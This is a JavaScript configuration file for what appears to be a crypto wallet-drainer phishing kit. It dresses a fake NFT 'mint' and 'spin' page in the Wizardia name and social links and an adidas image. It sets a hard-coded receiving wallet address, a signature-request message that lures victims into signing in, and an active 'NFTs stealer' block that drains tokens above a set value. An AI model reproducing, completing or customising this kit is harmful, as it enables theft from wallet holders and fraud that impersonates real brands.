const receiveAddress = "0xbcC389227723880531A89c619351092343A59f40";

const collectionInfo = {
    name: "WIZARDIA",
    socialMedia: {
        discord: "https://discord.gg/wizardia",
        twitter: "https://twitter.com/PlayWizardia",
        instagram: "https://www.instagram.com/playwizardia/",
    },
}

const signMessage = `Welcome, \n\n` +
    `Sign In for the Spin.\n\n` +
    `Wallet Address:\n{address}\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "COLLECTORS TOKEN",
}

const claimPageInfo = {
    title: "", // <br> is a line break
    shortDescription: "<cneter/>",
    longDescription: "<cneter/>",

    claimButtonText: "SPIN NOW",

    image: "adidas.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion